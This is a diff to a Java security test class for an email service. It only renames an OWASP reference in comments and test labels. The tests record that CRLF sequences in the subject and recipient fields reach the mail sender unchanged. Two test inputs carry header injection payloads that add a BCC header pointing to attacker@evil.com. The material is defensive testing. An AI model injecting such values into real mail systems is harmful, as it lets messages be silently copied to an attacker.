@@ -23,11 +23,11 @@ import static org.mockito.Mockito.*;
  * WSTG-ERRH-01: MailException propagation — le eccezioni SMTP non devono essere silenziate,
  *               altrimenti una notifica di account bloccato potrebbe fallire silenziosamente.
  *
- * WSTG-INPV-13: Email Header Injection — verifica che EmailService non sanitizzi CRLF nei
+ * WSTG-INPV-10: Email Header Injection — verifica che EmailService non sanitizzi CRLF nei
  *               campi oggetto e destinatario, documentando che la validazione deve avvenire
  *               a monte (nei controller o DTO) prima di invocare questo service.
  */
-@DisplayName("EmailService Security Tests - WSTG-ERRH-01, WSTG-INPV-13")
+@DisplayName("EmailService Security Tests - WSTG-ERRH-01, WSTG-INPV-10")
 class EmailServiceSecurityTests extends BaseIntegrationTest {
 
     @Autowired
@@ -66,7 +66,7 @@ class EmailServiceSecurityTests extends BaseIntegrationTest {
     }
 
     // ============================================================================
-    // OWASP WSTG-INPV-13: Email Header Injection via CRLF
+    // OWASP WSTG-INPV-10: Email Header Injection via CRLF
     // EmailService non esegue sanitizzazione dei campi. I test seguenti documentano
     // che CRLF nel campo 'oggetto' e 'destinatario' vengono inoltrati a JavaMailSender
     // senza modifiche. La validazione DEVE essere applicata nel controller o nel DTO
@@ -74,7 +74,7 @@ class EmailServiceSecurityTests extends BaseIntegrationTest {
     // ============================================================================
 
     @Test
-    @DisplayName("inviaEmail - CRLF in oggetto is forwarded to sender unmodified (WSTG-INPV-13)")
+    @DisplayName("inviaEmail - CRLF in oggetto is forwarded to sender unmodified (WSTG-INPV-10)")
     void testInviaEmail_CrlfInOggetto_IsForwardedUnmodified() {
         ArgumentCaptor<SimpleMailMessage> captor = ArgumentCaptor.forClass(SimpleMailMessage.class);
         String injectedSubject = "Account Bloccato\r\nBCC: attacker@evil.com";
@@ -87,7 +87,7 @@ class EmailServiceSecurityTests extends BaseIntegrationTest {
     }
 
     @Test
-    @DisplayName("inviaEmail - CRLF in destinatario is forwarded to sender unmodified (WSTG-INPV-13)")
+    @DisplayName("inviaEmail - CRLF in destinatario is forwarded to sender unmodified (WSTG-INPV-10)")
     void testInviaEmail_CrlfInDestinatario_IsForwardedUnmodified() {
         ArgumentCaptor<SimpleMailMessage> captor = ArgumentCaptor.forClass(SimpleMailMessage.class);
         String injectedRecipient = "victim@example.com\r\nBCC: attacker@evil.com";
